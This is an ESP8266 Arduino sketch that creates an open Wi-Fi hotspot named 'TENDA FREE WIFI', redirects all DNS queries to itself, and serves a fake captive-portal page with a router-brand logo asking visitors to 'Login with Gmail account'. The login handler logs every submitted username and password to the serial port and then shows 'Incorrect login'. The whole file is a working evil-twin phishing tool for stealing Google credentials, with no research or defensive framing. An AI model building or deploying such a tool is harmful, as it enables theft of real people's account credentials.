#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

const char* ssid = "TENDA FREE WIFI";      // Replace with your desired SSID
const char* password = NULL;    // Replace with your desired password

DNSServer dnsServer;                   // Create a DNS server
ESP8266WebServer webServer(80);               // Create a web server on port 80

const byte DNS_PORT = 53;              // Standard DNS port

const char *homePage = "<!DOCTYPE html>"
"<html>"
"<body>"
"<div style=\"display: flex;justify-content: center;align-items: center;\">"
"<svg viewBox=\"0 0 2500 952.03\" xmlns=\"http://www.w3.org/2000/svg\" width=\"600\" height=\"400\">"
"<g clip-rule=\"evenodd\" fill-rule=\"evenodd\">"
"<path d=\"M0 0h2500v761.59c0 104.5-85.79 190.44-190.28 190.44H0z\" fill=\"#e8511b\"/>"
"<path d=\"M1275 313.15c-64.03 1.45-113.86 15.64-171.58 53.05 4.67-17.25 9.36-34.35 14.04-53.05H966.02l-42.07 173.18c-14.19 59.34-28.22 117.07-42.25 176.41h149.8l40.64-165.45c20.31-85.78 56.11-129.49 126.4-131.09 62.4 0 85.79 37.41 65.47 118.52l-43.69 178.03h151.42l51.59-212.37c10.8-46.76-3.23-77.88-26.6-101.42-23.37-23.39-64.01-35.81-121.73-35.81zm1068.53-34.64c-27.64 0-50.37 22.73-50.37 50.37 0 27.81 22.72 50.37 50.37 50.37 27.81 0 50.37-22.55 50.37-50.37 0-27.65-22.56-50.37-50.37-50.37zm0 95.31c-24.76 0-44.94-20.18-44.94-44.94s20.18-44.94 44.94-44.94 44.94 20.18 44.94 44.94-20.18 44.94-44.94 44.94zm23.57-56.14c0-6.61-1.87-11.87-5.94-15.26-4.07-3.56-9.84-5.26-17.47-5.26h-18.32v63.6h9.16v-29.51l21.2 29.51h11.36l-17.81-24.59c5.09-.17 9.5-2.04 12.89-5.43 3.41-3.56 4.93-7.97 4.93-13.06zm-13.56 9.33c-3.22 2.04-7.8 3.05-14.25 3.05h-4.75v-24.25h6.95c5.77 0 10.01.68 12.72 2.71 2.54 1.87 4.07 4.92 4.07 8.99 0 4.41-1.69 7.47-4.74 9.5zm-146.87-6.11c-43.75-9.33-93.61-9.33-138.9 0-21.88 4.75-40.53 11.02-57.83 18.66-38.84 17.3-43.75 35.95-57.66 62.41 12.55-3.05 42.23-18.65 76.49-27.98 12.55-3.05 24.93-6.11 39.01-7.8 53.08-9.33 107.69-3.05 92.09 59.36-31.21 0-62.58 0-92.09 3.05-15.6 1.7-29.68 3.05-43.58 4.75-89.04 16.96-142.12 74.96-146.7 128.04v13.91c4.58 48.5 49.86 88.87 149.75 88.87l40.53-1.36h40.53l107.69-1.7 63.05-249.02c3.55-14.01 4.33-28.88.15-42.71-8.49-28.06-30.82-41.15-72.53-48.48zm-90.39 291.87l-45.45 1.53h-3.05c-115.49-1.53-110.91-113.97-17.13-138.9 6.27-1.53 10.85-3.05 17.13-4.75 28.15-4.58 56.13-3.05 85.81-4.58zM675.8 288.16H120.14l-12.42 59.34h190.43l-79.66 318.31H369.9l79.5-318.31zm1148.61-110.73l-39.01 149.75h-75.13c-18.66 0-35.78 1.53-52.91 3.05-56.13 4.75-103.11 18.65-137.2 39.01-46.98 28.15-75.13 70.38-84.46 124.82-1.53 9.5-3.05 17.3-3.05 25.1v13.91c1.53 35.95 17.13 65.63 43.75 87.51 24.76 20.18 66.99 24.93 85.81 24.93 9.33 0 53.08-3.05 95.14-15.6 20.35-4.75 39.01-12.38 56.3-21.88-18.99-1.53-37.65 0-56.3 0-34.43 0-67.16-4.58-92.09-27.98-20.35-18.65-26.46-46.98-18.65-85.98 6.27-37.31 21.88-65.46 48.33-84.12 20.35-14.08 40.53-20.35 62.41-25.1 37.31-6.27 76.32-3.05 113.96-1.53l-57.66 224.71c-4.75 17.13-11.02 35.95-14.08 54.78 49.86 0 124.82 4.58 135.67-34.43l115.49-450.94h-126.32zM874.02 534.76c-7.97 0-18.83 3.05-31.38 10.85-53.08 31.21-104.47 51.56-156.02 60.88-20.18 3.22-38.84 4.58-59.19 4.58-26.63 0-48.33-6.11-65.63-15.43-15.6-10.85-24.93-23.57-24.93-40.53 0-26.63 10.85-40.7 31.2-40.7h35.95c26.46 0 53.08-1.53 82.59-7.8 26.63-4.58 54.61-12.55 84.29-23.4 40.7-15.6 73.43-32.9 101.42-54.61 26.63-21.71 40.7-42.06 42.06-60.71v-4.75c-1.36-14.25-9.33-24.93-24.76-32.9-18.82-10.85-43.75-15.6-74.96-15.6-40.7 0-84.46 6.27-128.04 20.35-14.08 3.22-28.15 9.33-40.53 13.91-57.66 22.05-107.69 53.08-148.39 92.09-48.33 46.98-73.09 92.09-73.09 135.84 0 26.63 13.91 46.98 40.36 62.58 28.15 15.43 64.11 23.4 109.39 23.4 32.73 0 70.21-3.22 110.74-12.72h1.53c39.01-9.33 73.26-20.18 104.64-32.56 23.4-11.02 46.81-25.1 65.46-39.18 20.35-15.6 31.21-27.98 31.21-35.95-.01-4.59-4.59-7.64-13.92-7.64zm-285.59-93.78c12.38-12.38 26.46-24.76 42.06-35.78 18.66-14.08 37.48-23.4 56.13-31.21 21.88-10.85 45.28-15.6 65.63-15.6 15.6 1.53 27.98 3.22 37.31 9.5 7.97 4.58 12.72 12.38 12.72 21.71 0 11.02-7.97 24.93-25.1 39.01-15.6 12.38-35.95 23.4-59.36 32.73-10.85 3.22-20.18 4.75-31.21 7.97-26.46 4.58-56.13 7.63-87.34 7.63-20.18 0-29.51-3.05-29.51-7.63.01-6.29 6.12-14.09 18.67-28.33z\" fill=\"#fff\"/>"
"</g>"
"</svg>"
"</div>"
"<h3 style=\"display: flex;justify-content: center;align-items: center;\"> Login with Gmail account </h3>"
"<div style=\"display: flex;justify-content: center;align-items: center;\">"
"<form action='/login' method='POST'>"
"<input type='text' name='username' style=\"margin: 5px\" placeholder=\"example@gmail.com\"><br>"
"<input type='password' name='password' style=\"margin: 5px\" placeholder=\"*****\"><br>"
"<input type='submit' style=\"margin: 5px\">"
"</form>"
"</div>"
"</body>"
"</html>";

// Function to handle requests to the root URL
void handleRoot() {
  webServer.send(200, "text/html", homePage);
}

void handleLogin(){
  if (webServer.hasArg("username") && webServer.hasArg("password")) {
        String username = webServer.arg("username");
        String password = webServer.arg("password");

        // Print received data
        Serial.print("Received username: ");
        Serial.println(username);
        Serial.print("Received password: ");
        Serial.println(password);
  }
  webServer.send(401, "text/html", "<h1> Incorrect login</h1>");
}

void setup() {
    Serial.begin(115200);
    
    // Start the Access Point
    WiFi.softAP(ssid, password);
    
    // Print the AP IP address
    Serial.print("\n\nAccess Point IP: ");
    Serial.println(WiFi.softAPIP());

    // Start the DNS server
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

    // Handle root requests ("/")
    webServer.on("/", handleRoot);
    webServer.on("/login", handleLogin);

    // Start the web server
    webServer.begin();
    Serial.println("Web server started.");
}

void loop() {
    // Process DNS requests
    dnsServer.processNextRequest();
    
    // Handle web server requests
    webServer.handleClient();
}

